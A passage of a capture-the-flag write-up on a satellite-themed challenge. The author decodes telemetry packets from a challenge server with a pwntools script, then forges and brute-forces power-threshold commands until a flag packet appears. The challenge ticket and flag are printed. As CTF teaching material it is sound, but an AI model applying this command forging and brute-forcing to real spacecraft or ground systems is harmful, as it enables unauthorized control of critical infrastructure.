  <span class="n">LOW_PWR_MODE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">BATT_HTR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">PAYLOAD_PWR</span>   <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_PWR</span>      <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_PWR</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>

  <span class="n">PAYLOAD_ENABLE</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">FLAG_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">ADCS_ENABLE</span>    <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO1_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>
  <span class="n">RADIO2_ENABLE</span>  <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span>

  <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
  <span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
  <span class="n">BAD_CMD_COUNT</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;I</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

  <span class="k">return</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">low_pwr_thresh</span><span class="sh">"</span><span class="p">:</span> <span class="n">low_pwr_thresh</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">voltage</span><span class="sh">"</span><span class="p">:</span> <span class="n">voltage</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">LOW_PWR_MODE</span><span class="sh">"</span><span class="p">:</span> <span class="n">LOW_PWR_MODE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">BATT_HTR</span><span class="sh">"</span><span class="p">:</span> <span class="n">BATT_HTR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">PAYLOAD_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">PAYLOAD_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">FLAG_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">FLAG_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">ADCS_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">ADCS_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">RADIO1_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">RADIO1_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">RADIO2_PWR</span><span class="sh">"</span><span class="p">:</span> <span class="n">RADIO2_PWR</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">PAYLOAD_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">PAYLOAD_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">FLAG_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">FLAG_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">ADCS_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">ADCS_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">RADIO1_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">RADIO1_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">RADIO2_ENABLE</span><span class="sh">"</span><span class="p">:</span> <span class="n">RADIO2_ENABLE</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">BAD_CMD_COUNT</span><span class="sh">"</span><span class="p">:</span> <span class="n">BAD_CMD_COUNT</span><span class="p">,</span>
  <span class="p">}</span>


<span class="n">rv</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">goose.satellitesabove.me</span><span class="sh">"</span><span class="p">,</span> <span class="mi">5033</span><span class="p">)</span>
<span class="n">rv</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Ticket please:</span><span class="sh">"</span><span class="p">)</span>
<span class="n">rv</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">ticket{delta76170foxtrot:GCOmAUq4Fz8K0PQ1qFpviGNJXkI0FmI2eIDZ9BB2EvbrZwD0EoKIt0af4wyrI0W7QA}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">v</span> <span class="o">=</span> <span class="n">rv</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Telemetry Service running at </span><span class="sh">"</span><span class="p">)</span>
<span class="n">v</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">rv</span><span class="p">.</span><span class="nf">recv</span><span class="p">(),</span> <span class="n">encoding</span><span class="o">=</span><span class="sh">"</span><span class="s">utf8</span><span class="sh">"</span><span class="p">)</span>

<span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">v</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span>
<span class="n">port</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>

<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Connecting %s:%d</span><span class="sh">"</span> <span class="o">%</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>

<span class="n">r</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">""</span>

<span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Received %d bytes</span><span class="sh">"</span> <span class="o">%</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

    <span class="n">c_version</span><span class="p">,</span> <span class="n">c_type</span><span class="p">,</span> <span class="n">c_sechd</span><span class="p">,</span> <span class="n">c_apid</span><span class="p">,</span> <span class="n">c_gpflags</span><span class="p">,</span> <span class="n">c_ssc</span><span class="p">,</span> <span class="n">c_plen</span> <span class="o">=</span> <span class="nc">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">6</span><span class="p">:]</span>
    <span class="k">if</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="n">APID_FLAG_PACKET</span><span class="p">:</span>
      <span class="n">flag</span> <span class="o">=</span> <span class="nc">DecodeFlag</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">THE FLAG: %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">flag</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">c_apid</span> <span class="o">==</span> <span class="n">APID_EPS_PACKET</span><span class="p">:</span>
      <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">EPS: </span><span class="sh">"</span><span class="p">)</span>
      <span class="n">eps</span> <span class="o">=</span> <span class="nc">DecodeEPS</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="nf">pprint</span><span class="p">(</span><span class="n">eps</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">GOT PACKET %d with LENGTH %d</span><span class="sh">"</span> <span class="o">%</span><span class="p">(</span><span class="n">c_apid</span><span class="p">,</span> <span class="n">c_plen</span><span class="p">))</span>
      <span class="nf">print</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">ERROR: </span><span class="sh">"</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
    <span class="k">break</span>

<span class="n">rv</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p>If you see the code, I also implemented it to find which telemetry server to connect. So it basically connects to the main server, presents the ticket, gets the address of the telemetery server and then operates the telemetry server. I also let the EPS and FLAG decoder enabled on this one.</p>

<p><img src="/assets/posts/medium/1_J86N_zazHwBqairuHCIlgg.png" alt="Realtime Telemetry Decoding" /><em>Realtime Telemetry Decoding</em></p>

<p>Then I made a function called SendEnables which would send data back to the satellite trying to enable the flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">SendEnables</span><span class="p">():</span>
  <span class="n">r</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nc">EncodeHeader</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x02\x01</span><span class="sh">"</span><span class="p">)</span> <span class="c1"># Payload
</span>
  <span class="c1"># (...)
</span>  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="nc">SendEnables</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
    <span class="c1"># (...)
</span></code></pre></div></div>

<p>The first two bytes are the restriction imposed by the EnableFLAG command according to XTCE. The third byte represents the PowerState in which value 1 is for POWER ON state.</p>

<p>Sadly, that didn’t worked. The satellite seemed to be ignoring the command since the BAD_CMD_COUNT field wasn’t increasing. Then I started playing with other enables. I noticed that the voltage value was increasing every time I received a EPS packet. According to the doc this value is a two byte encoded float in some weird way.</p>

<p><img src="/assets/posts/medium/1_FJ_GNpNWFstomDCulVZs_w.png" alt="VoltageType definition" /><em>VoltageType definition</em></p>

<p>I tried for a few hours to understand what that that meant. I couldn’t figure out so I just decoded as a uint16. I couldn’t figure out to calculate so I just assumed its a normal uint16 that would have direct correlation to voltage itself.</p>

<p>So I imagine that it was some sort of voltage related issue since when the voltage value reached the same value as LOW_POWER_THRESH the connection went off. So I decided to encode the command to send the LOW_POWER_THRESH change values.</p>

<p><img src="/assets/posts/medium/1_ny8lIZj3RH0JmfHMkPrrhQ.png" alt="LOW_PWR_THRES command" /><em>LOW_PWR_THRES command</em></p>

<p>Since that would have PLENGTH =3, I did another function to create the header (yes, I was lazy).</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">EncodeHeader2</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_version</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_type</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_sechd</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_ssc</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="c1"># (...)
</span><span class="n">r</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nc">EncodeHeader2</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x0C</span><span class="sh">"</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="mi">1000</span><span class="p">))</span> <span class="c1"># LW_PWR_THRES
</span></code></pre></div></div>

<p>And since I had no clue how to encode that, I send some random values (like 65535, 0, 32768). All of them were incrementing the BAD_CMD_COUNT which probably mean that I was not encoding valid values. So I decided a bruteforce approach to find out which values were valid.</p>

<p>Since it was slow, I decided to send 100 commands each time send enable was calculated.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">SendEnables</span><span class="p">():</span>
  <span class="k">global</span> <span class="n">s</span>
  <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Sending enable %d</span><span class="sh">"</span> <span class="o">%</span> <span class="n">s</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nc">EncodeHeader2</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x00\x0C</span><span class="sh">"</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="n">s</span><span class="p">))</span> <span class="c1"># LW_PWR_THRES
</span>    <span class="n">s</span> <span class="o">+=</span> <span class="mi">1</span>
</code></pre></div></div>

<p>I was only expecting it to not increment the BAD_CMD_COUNT sometime, so I could find out the range of valid values. But after it reached 1200</p>

<p><img src="/assets/posts/medium/1_rbUMCcuP6CmzB1Dh1lqmxg.png" alt="FLAG FOUND!" /><em>FLAG FOUND!</em></p>

<p>The flag poped out!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag{delta76170foxtrot:GJiGsdjw9Kdc5UONnu06i42WeTMVNH1OzOKJTzIq6lJPbLCtb3AsRu2YUVGn-Slb2vnXh2vLC36D-xvKISAKD68}\x00\x19\x03\x00\x03@)L}
</code></pre></div></div>

<p>There was a very big moment of laugh in my team because of that (we were in discord and everyone was seeing my screen in that moment). That must not be a safe way to control a satellite :P</p>

<p>Full Script</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="kn">import</span> <span class="n">sys</span><span class="p">,</span> <span class="n">struct</span><span class="p">,</span> <span class="n">binascii</span>

<span class="kn">from</span> <span class="n">pprint</span> <span class="kn">import</span> <span class="n">pprint</span>


<span class="n">APID_FLAG_PACKET</span> <span class="o">=</span> <span class="mi">102</span>
<span class="n">APID_EPS_PACKET</span> <span class="o">=</span> <span class="mi">103</span>
<span class="n">APID_PAYLOAD_PACKET</span> <span class="o">=</span> <span class="mi">105</span>

<span class="n">enableflag</span> <span class="o">=</span> <span class="p">{</span>
  <span class="sh">"</span><span class="s">c_version</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_type</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_sechd</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">:</span> <span class="mi">103</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_ssc</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
  <span class="sh">"</span><span class="s">c_plen</span><span class="sh">"</span><span class="p">:</span> <span class="mi">2</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">EncodeHeader</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_version</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_type</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_sechd</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_ssc</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_plen</span><span class="sh">"</span><span class="p">])</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_plen</span><span class="sh">"</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>

<span class="k">def</span> <span class="nf">EncodeHeader2</span><span class="p">():</span>
  <span class="n">data</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">6</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_version</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_type</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_sechd</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="p">((</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_apid</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_gpflags</span><span class="sh">"</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">enableflag</span><span class="p">[</span><span class="sh">"</span><span class="s">c_ssc</span><span class="sh">"</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
  <span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
  <span class="k">return</span> <span class="n">data</span>


<span class="k">def</span> <span class="nf">DecodeHeader</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
  <span class="n">c_version</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xE0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">5</span>
  <span class="n">c_type</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
  <span class="n">c_sechd</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span>
  <span class="n">c_apid</span> <span class="o">=</span> <span class="p">((</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="n">c_gpflags</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xC0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span>
